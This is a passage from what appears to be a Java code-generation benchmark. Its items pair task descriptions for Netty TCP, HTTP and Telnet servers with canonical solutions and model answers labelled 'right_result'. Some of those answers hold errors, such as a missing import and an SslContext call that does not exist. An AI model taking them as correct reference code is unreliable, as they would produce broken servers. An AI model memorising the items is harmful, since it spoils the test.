    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class MockTcpServer {\n    private final NioEventLoopGroup bossGroup = new NioEventLoopGroup(1);\n    private final NioEventLoopGroup workerGroup = new NioEventLoopGroup();\n    private Channel channel;\n    private final List<Supplier<? extends ChannelHandler>> handlers = new ArrayList<>();\n\n    public void addHandler(Supplier<? extends ChannelHandler> supplier) {\n        handlers.add(supplier);\n    }\n\n    public void initialize(int port) throws InterruptedException {\n        ServerBootstrap bootstrap = new ServerBootstrap();\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<>() {\n                    @Override\n                    protected void initChannel(Channel ch) {\n                        for (Supplier<? extends ChannelHandler> handlerSupplier : handlers) {\n                            ch.pipeline().addLast(handlerSupplier.get());\n                        }\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n        channel = bootstrap.bind(port).sync().channel();\n        channel.closeFuture().sync();\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n        }\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static class Resources {\n        private static final NioEventLoopGroup sharedBossGroup = new NioEventLoopGroup(1);\n        private static final NioEventLoopGroup sharedWorkerGroup = new NioEventLoopGroup();\n\n        static {\n            Runtime.getRuntime().addShutdownHook(new Thread(() -> {\n                sharedBossGroup.shutdownGracefully();\n                sharedWorkerGroup.shutdownGracefully();\n            }));\n        }\n\n        public static NioEventLoopGroup getSharedBossGroup() {\n            return sharedBossGroup;\n        }\n\n        public static NioEventLoopGroup getSharedWorkerGroup() {\n            return sharedWorkerGroup;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 177,
    "Instruction": "Task Description: Create a Java class that implements an embedded HTTP server using Netty framework, capable of handling HTTP requests and routing them to appropriate controller methods based on URI paths.\n\nClass Description: EmbedHttpServer is a Netty-based HTTP server implementation that provides request routing functionality to various controller methods. It supports adding custom controllers with RequestMapping annotations and handles both successful responses and error cases.\n\nAttributes:\n- port: int - The port number on which the server will listen\n- defaultController: DefaultController - The default controller to handle unmatched requests\n- controllerList: List<Object> - List of registered controller objects that handle specific routes\n- LOGGER: Logger - Logger instance for error and debug logging\n\nMethods:\n- EmbedHttpServer(int port) -> EmbedHttpServer - Constructor that initializes the server with specified port\n- invoke(String uri, Channel channel, FullHttpRequest request) -> FullHttpResponse - Routes the incoming request to the appropriate controller method based on URI matching\n- fixUri(String uri) -> String - Normalizes URI paths by ensuring proper slash formatting\n- start(GenericFutureListener startedListener) -> void - Starts the Netty server with specified configuration and event listeners\n- addController(Object obj) -> EmbedHttpServer - Registers a controller object to handle specific routes, supports method chaining",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.SimpleChannelInboundHandler;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaderValues;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpResponseStatus;\nimport io.netty.handler.codec.http.HttpServerCodec;\nimport io.netty.util.concurrent.GenericFutureListener;\nimport java.lang.reflect.Method;\nimport java.net.URI;\nimport java.util.ArrayList;\nimport java.util.HashMap;\nimport java.util.List;\nimport java.util.Map;\nimport org.pdown.gui.http.controller.DefaultController;\nimport org.pdown.gui.http.util.HttpHandlerUtil;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport org.springframework.web.bind.annotation.RequestMapping;\n\npublic class EmbedHttpServer {\n\n  private static final Logger LOGGER = LoggerFactory.getLogger(EmbedHttpServer.class);\n\n  private int port;\n  private DefaultController defaultController;\n  private List<Object> controllerList;\n\n  public EmbedHttpServer(int port) {\n    this.port = port;\n    this.defaultController = new DefaultController();\n    this.controllerList = new ArrayList<>();\n  }\n\n  public FullHttpResponse invoke(String uri, Channel channel, FullHttpRequest request) throws Exception {\n    if (controllerList != null) {\n      for (Object obj : controllerList) {\n        Class<?> clazz = obj.getClass();\n        RequestMapping mapping = clazz.getAnnotation(RequestMapping.class);\n        if (mapping != null) {\n          String mappingUri = fixUri(mapping.value()[0]);\n          for (Method actionMethod : clazz.getMethods()) {\n            RequestMapping subMapping = actionMethod.getAnnotation(RequestMapping.class);\n            if (subMapping != null) {\n              String subMappingUri = fixUri(subMapping.value()[0]);\n              if (uri.equalsIgnoreCase(mappingUri + subMappingUri)) {\n                return (FullHttpResponse) actionMethod.invoke(obj, channel, request);\n              }\n            }\n          }\n        }\n      }\n    }\n    return defaultController.handle(channel, request);\n  }\n\n  private String fixUri(String uri) {\n    StringBuilder builder = new StringBuilder(uri);\n    if (builder.indexOf(\"/\") != 0) {\n      builder.insert(0, \"/\");\n    }\n    if (builder.lastIndexOf(\"/\") == builder.length() - 1) {\n      builder.delete(builder.length() - 1, builder.length());\n    }\n    return builder.toString();\n  }\n\n  public void start(GenericFutureListener startedListener) {\n    NioEventLoopGroup bossGroup = new NioEventLoopGroup(2);\n    NioEventLoopGroup workGroup = new NioEventLoopGroup(2);\n    try {\n      ServerBootstrap bootstrap = new ServerBootstrap().group(bossGroup, workGroup)\n          .channel(NioServerSocketChannel.class)\n          .childHandler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) throws Exception {\n              ch.pipeline().addLast(\"httpCodec\", new HttpServerCodec());\n              ch.pipeline().addLast(new HttpObjectAggregator(4194304));\n              ch.pipeline()\n                  .addLast(\"serverHandle\", new SimpleChannelInboundHandler<FullHttpRequest>() {\n\n                    @Override\n                    protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) throws Exception {\n                      URI uri = new URI(request.uri());\n                      FullHttpResponse httpResponse = invoke(uri.getPath(), ctx.channel(), request);\n                      if (httpResponse != null) {\n                        httpResponse.headers().set(HttpHeaderNames.CONNECTION, HttpHeaderValues.KEEP_ALIVE);\n                        httpResponse.headers().set(HttpHeaderNames.CONTENT_LENGTH, httpResponse.content().readableBytes());\n                        ch.writeAndFlush(httpResponse);\n                      }\n                    }\n\n                    @Override\n                    public void channelUnregistered(ChannelHandlerContext ctx) {\n                      ctx.channel().close();\n                    }\n\n                    @Override\n                    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n                      LOGGER.error(\"native request error\", cause.getCause() == null ? cause : cause.getCause());\n                      Map<String, Object> data = new HashMap<>();\n                      data.put(\"error\", cause.getCause().toString());\n                      FullHttpResponse httpResponse = HttpHandlerUtil.buildJson(data);\n                      httpResponse.setStatus(HttpResponseStatus.INTERNAL_SERVER_ERROR);\n                      ctx.channel().writeAndFlush(httpResponse);\n                    }\n                  });\n            }\n          });\n      ChannelFuture f = bootstrap.bind(\"127.0.0.1\", port).sync();\n      if (startedListener != null) {\n        f.addListener(startedListener);\n      }\n      f.channel().closeFuture().sync();\n    } catch (Exception e) {\n      e.printStackTrace();\n    } finally {\n      bossGroup.shutdownGracefully();\n      workGroup.shutdownGracefully();\n    }\n  }\n\n  public EmbedHttpServer addController(Object obj) {\n    this.controllerList.add(obj);\n    return this;\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.Unpooled;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.util.concurrent.GenericFutureListener;\n\nimport java.lang.reflect.Method;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.logging.Logger;\n\npublic class EmbedHttpServer {\n    private int port;\n    private DefaultController defaultController = new DefaultController();\n    private List<Object> controllerList = new ArrayList<>();\n    private static final Logger LOGGER = Logger.getLogger(EmbedHttpServer.class.getName());\n\n    public EmbedHttpServer(int port) {\n        this.port = port;\n    }\n\n    public FullHttpResponse invoke(String uri, Channel channel, FullHttpRequest request) {\n        String normalizedUri = fixUri(uri);\n        for (Object controller : controllerList) {\n            for (Method method : controller.getClass().getDeclaredMethods()) {\n                RequestMapping mapping = method.getAnnotation(RequestMapping.class);\n                if (mapping != null && mapping.value().equals(normalizedUri)) {\n                    try {\n                        return (FullHttpResponse) method.invoke(controller, request);\n                    } catch (Exception e) {\n                        LOGGER.severe(\"Error invoking controller method: \" + e.getMessage());\n                        return new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.INTERNAL_SERVER_ERROR,\n                                Unpooled.copiedBuffer(\"Internal Server Error\", request.headers().get(HttpHeaderNames.CONTENT_TYPE)));\n                    }\n                }\n            }\n        }\n        return defaultController.handle(request);\n    }\n\n    public String fixUri(String uri) {\n        if (uri == null || uri.isEmpty() || \"/\".equals(uri)) {\n            return \"/\";\n        }\n        if (!uri.startsWith(\"/\")) {\n            uri = \"/\" + uri;\n        }\n        while (uri.contains(\"//\")) {\n            uri = uri.replace(\"//\", \"/\");\n        }\n        return uri;\n    }\n\n    public void start(GenericFutureListener startedListener) {\n        EventLoopGroup bossGroup = new NioEventLoopGroup();\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ChannelPipeline pipeline = ch.pipeline();\n                            pipeline.addLast(new HttpRequestDecoder());\n                            pipeline.addLast(new HttpResponseEncoder());\n                            pipeline.addLast(new SimpleChannelInboundHandler<FullHttpRequest>() {\n                                @Override\n                                protected void channelRead0(ChannelHandlerContext ctx, FullHttpRequest request) {\n                                    FullHttpResponse response = invoke(request.uri(), ctx.channel(), request);\n                                    ctx.writeAndFlush(response).addListener((ChannelFutureListener) future -> {\n                                        if (!future.isSuccess()) {\n                                            LOGGER.severe(\"Failed to send response: \" + future.cause().getMessage());\n                                        }\n                                    });\n                                }\n                            });\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).addListener(startedListener);\n            f.sync();\n            f.channel().closeFuture().sync();\n        } catch (Exception e) {\n            LOGGER.severe(\"Server failed to start: \" + e.getMessage());\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n        }\n    }\n\n    public EmbedHttpServer addController(Object obj) {\n        controllerList.add(obj);\n        return this;\n    }\n\n    public interface RequestMapping {\n        String value();\n    }\n\n    public class DefaultController {\n        public FullHttpResponse handle(FullHttpRequest request) {\n            return new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.NOT_FOUND,\n                    Unpooled.copiedBuffer(\"404 Not Found\", request.headers().get(HttpHeaderNames.CONTENT_TYPE)));\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 178,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework with line-based frame decoding capability. The server should handle incoming connections, process line-delimited messages, and manage resources properly during startup and shutdown.\n\nClass Description: MyLineBasedFrameDecoderServer is a Netty-based TCP server that uses line-based frame decoding for handling text protocols. It manages server lifecycle including startup, connection handling, and graceful shutdown.\n\nAttributes:\n- bossGroup: [NioEventLoopGroup] - Handles incoming connection requests and accepts them\n- workerGroup: [NioEventLoopGroup] - Handles I/O operations for accepted connections\n- bootstrap: [ServerBootstrap] - Netty server configuration and management object\n- DEFAULT_PORT: [int] - Default port number for the server (8023)\n\nMethods:\n- start([int port]) -> [void] - Starts the server on specified port, binds handlers, and begins accepting connections. Throws Exception if startup fails.\n- shutdown() -> [void] - Gracefully shuts down the server by releasing all thread resources\n- main([String[] args]) -> [void] - Entry point that creates and starts the server instance on default port",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class MyLineBasedFrameDecoderServer {\n\n    public static int DEFAULT_PORT = 8023;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public MyLineBasedFrameDecoderServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start(int port) throws Exception {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new MyLineBasedFrameDecoderChannelInitializer())\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = bootstrap.bind(port).sync();\n            System.out.println(\"MyLineBasedFrameDecoderServer\u5df2\u542f\u52a8\uff0c\u7aef\u53e3\uff1a\" + port);\n            f.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        workerGroup.shutdownGracefully();\n        bossGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        int port = DEFAULT_PORT;\n        MyLineBasedFrameDecoderServer server = new MyLineBasedFrameDecoderServer();\n        server.start(port);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LineBasedFrameDecoder;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\n\npublic class MyLineBasedFrameDecoderServer {\n    private static final int DEFAULT_PORT = 8023;\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup();\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final ServerBootstrap bootstrap = new ServerBootstrap();\n\n    public void start(int port) throws Exception {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            ch.pipeline().addLast(new LineBasedFrameDecoder(1024));\n                            ch.pipeline().addLast(new StringDecoder());\n                            ch.pipeline().addLast(new StringEncoder());\n                            // Add your business logic handler here\n                        }\n                    })\n                    .option(ChannelOption.SO_BACKLOG, 128)\n                    .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture future = bootstrap.bind(port).sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            shutdown();\n        }\n    }\n\n    public void shutdown() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) {\n        try {\n            MyLineBasedFrameDecoderServer server = new MyLineBasedFrameDecoderServer();\n            server.start(DEFAULT_PORT);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 179,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework to handle client connections and manage heartbeat detection.\n\nClass Description: The HeartbeatServer class is a Netty-based TCP server that listens for incoming connections on a specified port, manages client connections using boss and worker event loop groups, and includes proper startup and shutdown procedures.\n\nAttributes:\n- PORT: [static final int] - The port number on which the server will listen for connections\n- bossGroup: [EventLoopGroup] - The parent event loop group that accepts incoming connections\n- workerGroup: [EventLoopGroup] - The child event loop group that handles the traffic of accepted connections\n- bootstrap: [ServerBootstrap] - The server configuration object that binds the server components together\n\nMethods:\n- HeartbeatServer() -> [constructor] - Initializes the server components including event loop groups and server bootstrap\n- start() throws Exception -> [void] - Configures and starts the server, binds to the specified port, and begins accepting connections\n- stop() -> [void] - Shuts down the server gracefully by closing all event loop groups",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\n\npublic final class HeartbeatServer {\n    static final int PORT = 8082;\n\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n    private ServerBootstrap bootstrap;\n\n    public HeartbeatServer() {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n        bootstrap = new ServerBootstrap();\n    }\n\n    public void start() throws Exception {\n        try {\n            bootstrap.group(bossGroup, workerGroup)\n                     .channel(NioServerSocketChannel.class)\n                     .option(ChannelOption.SO_BACKLOG, 100)\n                     .handler(new LoggingHandler(LogLevel.INFO))\n                     .childHandler(new HeartbeatHandlerInitializer());\n\n            ChannelFuture f = bootstrap.bind(PORT).sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            stop();\n        }\n    }\n\n    public void stop() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\n\npublic class HeartbeatServer {\n    private static final int PORT = 8080;\n    private final EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n    private final EventLoopGroup workerGroup = new NioEventLoopGroup();\n    private final ServerBootstrap bootstrap = new ServerBootstrap();\n\n    public HeartbeatServer() {\n        bootstrap.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        // Add heartbeat and message handling pipeline here\n                    }\n                })\n                .option(ChannelOption.SO_BACKLOG, 128)\n                .childOption(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    public void start() throws Exception {\n        ChannelFuture future = bootstrap.bind(PORT).sync();\n        future.channel().closeFuture().sync();\n    }\n\n    public void stop() {\n        bossGroup.shutdownGracefully();\n        workerGroup.shutdownGracefully();\n    }\n\n    public static void main(String[] args) throws Exception {\n        try {\n            HeartbeatServer server = new HeartbeatServer();\n            server.start();\n        } finally {\n            System.out.println(\"Server shutting down.\");\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 180,
    "Instruction": "Task Description: Create a Java class that implements a TCP server using Netty framework, capable of handling Telnet connections with optional SSL encryption.\n\nClass Description: The TelnetServer class is a Netty-based TCP server implementation that listens for incoming Telnet connections. It supports optional SSL encryption and uses separate thread groups for connection acceptance and request processing. The server logs connection events and properly manages resources during shutdown.\n\nAttributes:\n- SSL: static final boolean - Flag indicating whether SSL encryption should be enabled (configured via system property)\n- PORT: static final int - The port number the server will bind to (configurable via system property, defaults to 8023 or 8992 for SSL)\n\nMethods:\n- start(): void - Starts the Telnet server, binds to the configured port, and begins accepting connections. Throws Exception if any error occurs during startup.\n  Input: None\n  Output: None (void)\n  Description: Initializes SSL context if enabled, creates event loop groups, configures server bootstrap with channel type and handlers, binds to port, and waits for server shutdown. Ensures proper resource cleanup during shutdown.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\npublic final class TelnetServer {\n\n    static final boolean SSL = System.getProperty(\"ssl\") != null;\n    static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        final SslContext sslCtx;\n        if (SSL) {\n            SelfSignedCertificate ssc = new SelfSignedCertificate();\n            sslCtx = SslContextBuilder.forServer(ssc.certificate(), ssc.privateKey()).build();\n        } else {\n            sslCtx = null;\n        }\n\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .handler(new LoggingHandler(LogLevel.INFO))\n             .childHandler(new TelnetServerInitializer(sslCtx));\n\n            b.bind(PORT).sync().channel().closeFuture().sync();\n        } finally {\n            bossGroup.shutdownGracefully();\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.LineBasedFrameDecoder;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.SelfSignedCertificate;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.util.logging.Logger;\n\npublic class TelnetServer {\n    private static final Logger logger = Logger.getLogger(TelnetServer.class.getName());\n    private static final boolean SSL = System.getProperty(\"ssl\") != null;\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", SSL ? \"8992\" : \"8023\"));\n\n    public void start() throws Exception {\n        EventLoopGroup bossGroup = new NioEventLoopGroup(1);\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n        try {\n            ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n             .channel(NioServerSocketChannel.class)\n             .childHandler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) {\n                     if (SSL) {\n                         ch.pipeline().addLast(SslContext.getDefault().newHandler(ch.alloc()));\n                     }\n                     ch.pipeline().addLast(new LineBasedFrameDecoder(8192));\n                     ch.pipeline().addLast(new StringDecoder(), new StringEncoder());\n                     ch.pipeline().addLast(new TelnetServerHandler());\n                 }\n             })\n             .option(ChannelOption.SO_BACKLOG, 100)\n             .childOption(ChannelOption.SO_KEEPALIVE, true);\n\n            ChannelFuture f = b.bind(PORT).sync();\n            logger.info(\"Telnet server started on port \" + PORT + (SSL ? \" with SSL\" : \"\"));\n            f.channel().closeFuture().sync();\n        } finally {\n            workerGroup.shutdownGracefully();\n            bossGroup.shutdownGracefully();\n            logger.info(\"Telnet server shutdown completed.\");\n        }\n    }\n\n    public static void main(String[] args) throws Exception {\n        new TelnetServer().start();\n    }\n}\n\nclass TelnetServerHandler extends io.netty.channel.ChannelInboundHandlerAdapter {\n    private static final Logger logger = Logger.getLogger(TelnetServerHandler.class.getName());\n\n    @Override\n    public void channelActive(io.netty.channel.ChannelHandlerContext ctx) {\n        logger.info(\"Client connected: \" + ctx.channel().remoteAddress());\n    }\n\n    @Override\n    public void channelRead(io.netty.channel.ChannelHandlerContext ctx, Object msg) {\n        String request = (String) msg;\n        logger.info(\"Received: \" + request.trim());\n        ctx.writeAndFlush(\"Echo: \" + request);\n    }\n\n    @Override\n    public void exceptionCaught(io.netty.channel.ChannelHandlerContext ctx, Throwable cause) {\n        logger.severe(\"Exception caught: \" + cause.getMessage());\n        ctx.close();\n    }\n\n    @Override\n    public void channelInactive(io.netty.channel.ChannelHandlerContext ctx) {\n        logger.info(\"Client disconnected: \" + ctx.channel().remoteAddress());\n    }\n}\n```"
  },
  {
    "Task_id": 181,
    "Instruction": "Task Description: Implement a TCP server using Java Netty framework that can handle HTTP requests and responses efficiently with proper resource management.\n\nClass Description: NettyTCPServer is a class that creates and manages a TCP server using Netty framework. It handles HTTP protocol communication with clients, including request decoding, response encoding, chunked writes, and message aggregation. The server is designed to be non-blocking and supports graceful shutdown.\n\nAttributes:\nport: int - The port number on which the server will listen for incoming connections\nchannel: Channel - The server's communication channel\nbossGroup: EventLoopGroup - The parent event loop group that accepts incoming connections\nworkerGroup: EventLoopGroup - The child event loop group that handles the traffic of accepted connections\n\nMethods:\nstart(): void - Starts the TCP server on the specified port. Initializes event loop groups, configures server bootstrap with HTTP handlers, and binds to the port. Throws InterruptedException if interrupted during startup.\nshutdown(): void - Gracefully shuts down the server by closing the channel and shutting down event loop groups. Handles any InterruptedException during shutdown.\n\nThe class uses Netty's NIO transport and includes HTTP-specific handlers for proper protocol handling. It maintains proper resource management through graceful shutdown mechanisms.",
    "Canonical_solution": "import io.netty.bootstrap.ServerBootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\npublic class NettyTCPServer {\n\n    private static final Logger Logger = LoggerFactory.getLogger(NettyTCPServer.class);\n    private int port;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public NettyTCPServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        bossGroup = new NioEventLoopGroup(2);\n        workerGroup = new NioEventLoopGroup();\n\n        try {\n            final ServerBootstrap b = new ServerBootstrap();\n            b.group(bossGroup, workerGroup)\n                .channel(NioServerSocketChannel.class)\n                .option(ChannelOption.SO_BACKLOG, 10240)\n                .childOption(ChannelOption.SO_KEEPALIVE, true)\n                .option(ChannelOption.SO_REUSEADDR, true)\n                .childOption(ChannelOption.TCP_NODELAY, true)\n                .childOption(ChannelOption.SO_SNDBUF, 1024*64)\n                .childOption(ChannelOption.SO_RCVBUF, 1024*64)\n                .childHandler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel socketChannel) throws Exception {\n                        socketChannel.pipeline().addLast(new HttpRequestDecoder());\n                        socketChannel.pipeline().addLast(new HttpResponseEncoder());\n                        socketChannel.pipeline().addLast(new ChunkedWriteHandler());\n                        socketChannel.pipeline().addLast(new HttpObjectAggregator(100 * 1024 * 1024));\n                    }\n                });\n\n            channel = b.bind(port).sync().channel();\n            Logger.info(\"Server started on port {}\", port);\n        } catch (Exception e) {\n            Logger.error(\"Failed to start server on port {}: {}\", port, e.getMessage());\n            throw e;\n        }\n    }\n\n    public void shutdown() {\n        if (channel != null) {\n            channel.close();\n            try {\n                channel.closeFuture().sync();\n            } catch (InterruptedException e) {\n                Logger.error(\"Error during server shutdown: {}\", e.getMessage());\n            }\n        }\n        if (bossGroup != null) {\n            bossGroup.shutdownGracefully();\n        }\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 4,
    "right_result": "```java\nimport io.netty.bootstrap.ServerBootstrap;\nimport io.netty.buffer.PooledByteBufAllocator;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioServerSocketChannel;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.HttpRequestDecoder;\nimport io.netty.handler.codec.http.HttpResponseEncoder;\nimport io.netty.handler.stream.ChunkedWriteHandler;\n\npublic class NettyTCPServer {\n    private final int port;\n    private Channel channel;\n    private EventLoopGroup bossGroup;\n    private EventLoopGroup workerGroup;\n\n    public NettyTCPServer(int port) {\n        this.port = port;\n    }\n\n    public void start() throws InterruptedException {\n        bossGroup = new NioEventLoopGroup(1);\n        workerGroup = new NioEventLoopGroup();\n\n        try {\n            ServerBootstrap bootstrap = new ServerBootstrap();\n            bootstrap.group(bossGroup, workerGroup)\n                    .channel(NioServerSocketChannel.class)\n                    .childHandler(new ChannelInitializer<>() {\n                        @Override\n                        protected void initChannel(Channel ch) {\n                            ch.pipeline().addLast(\"decoder\", new HttpRequestDecoder());\n                            ch.pipeline().addLast(\"aggregator\", new HttpObjectAggregator(65536));\n                            